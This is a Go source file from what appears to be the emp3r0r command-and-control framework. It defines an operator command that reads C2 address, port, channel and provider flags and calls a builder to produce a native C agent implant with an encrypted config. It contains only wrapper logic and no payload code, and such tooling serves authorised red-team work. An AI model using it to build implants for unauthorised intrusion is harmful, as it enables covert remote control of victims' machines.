package operator

import (
	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/spf13/cobra"
)

// CmdGenerateCAgent builds the native C agent (aquila). It is reached through
// `generate --type aquila` rather than a separate command, so the C agent shares
// the Go generator's config flags and only adds the provider selection below.
func CmdGenerateCAgent(cmd *cobra.Command) {
	opts := builder.AgentConfig{
		CCAddress:     getStringOptPtr(cmd, "cc"),
		CCHTTPPort:    getStringOptPtr(cmd, "cc-http-port"),
		C2ChannelMode: getStringOptPtr(cmd, "c2-channel-mode"),
	}
	providers := builder.CAgentProviders{
		Crypto:    flagString(cmd, "crypto"),
		Gzip:      flagString(cmd, "gzip"),
		HTTP:      flagString(cmd, "http"),
		Transport: flagString(cmd, "transport"),
	}

	res, err := builder.GenerateCAgentWorkflow(opts, providers, client.SignAgent)
	if err != nil {
		logging.Errorf("Failed to generate C agent: %v", err)
		return
	}

	logging.Successf("Generated C agent: %s", res.OutputFile)
	logging.Infof("C agent UUID: %s", util.AgentRef(res.AgentUUID))
	logging.Infof("Config payload: %d bytes, encrypted with the C2 MagicString", res.ConfigSize)
}

func flagString(cmd *cobra.Command, name string) string {
	v, _ := cmd.Flags().GetString(name)
	return v
}
